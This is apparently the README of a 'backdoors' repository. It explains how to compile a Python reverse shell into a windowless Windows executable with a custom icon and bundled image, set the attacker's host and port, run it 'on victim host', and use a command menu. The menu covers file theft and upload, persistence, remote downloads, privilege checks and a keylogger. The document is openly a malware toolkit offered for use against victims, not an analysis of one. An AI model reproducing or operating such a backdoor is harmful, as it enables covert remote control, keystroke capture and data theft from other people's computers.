# backdoors
Basic scripts and reverse shell programs

## Reverse Shell

### Compile
The backdoor [reverse_shell.exe](/reverse_shell/dist/) is compiled using pyinstaller:  
```
python -m PyInstaller reverse_shell.py --onefile --noconsole --add-data="assets/image.jpg;." --icon=assets/image.ico
```

### Usage
1. Edit the ```host``` variable on both server.py and reverse_shell.py, setting the **(IP, port)** of the host that will run the ```server.py``` 
2. Recompile the reverse_shell.py  
3. Start ```server.py``` on the attacker host  
4. Start ```reverse_shell.exe``` on victim host
5. On server, type ```help``` to show commands instructions

```
* Shell#~('127.0.0.1', 64673): help
Available functions:
- cd {path} => change host directory
- download {file} => Download a file from host
- upload {file} => Upload a file to the host
- persistence => Try acquiring persistence
- get {url} => Download a remote file
- isadmin => Check user privileges
- keylogger start|dump|stop => start the keylogger|dump the log keylog|stop the keylogger
- exit => quit the service
```
